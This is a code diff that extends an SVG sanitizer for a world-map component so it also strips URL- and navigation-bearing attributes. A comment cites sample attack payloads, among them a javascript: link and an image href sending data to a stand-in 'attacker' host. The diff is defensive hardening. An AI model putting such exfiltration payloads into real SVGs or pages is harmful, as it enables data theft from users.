@@ -9,7 +9,14 @@ const STYLE_BLOCK = `
 .fiat-world-map .world-countries{stroke-width:0.7}
 `;
 
-// Sanitize parsed SVG: strip <script> elements and on* event-handler attributes.
+// URL-/navigation-bearing attributes that can drive data exfiltration or
+// navigation from a poisoned SVG (e.g. <a href="javascript:…">,
+// <image href="https://attacker/?data=…">, <use href="#…">). The static
+// world-countries map is pure geometry and never needs these.
+const UNSAFE_ATTRS = new Set(["href", "xlink:href", "src", "action", "formaction", "data"]);
+
+// Sanitize parsed SVG: strip <script> elements, on* event-handler attributes,
+// and URL-/navigation-bearing attributes.
 // Defense-in-depth against a poisoned /maps/world-countries.svg response.
 function sanitizeSvg(root: Element): void {
   root.querySelectorAll("script").forEach((el) => el.remove());
@@ -18,7 +25,8 @@ function sanitizeSvg(root: Element): void {
   while (node) {
     if (node instanceof Element) {
       for (const attr of Array.from(node.attributes)) {
-        if (attr.name.toLowerCase().startsWith("on")) node.removeAttribute(attr.name);
+        const name = attr.name.toLowerCase();
+        if (name.startsWith("on") || UNSAFE_ATTRS.has(name)) node.removeAttribute(attr.name);
       }
     }
     node = walker.nextNode();
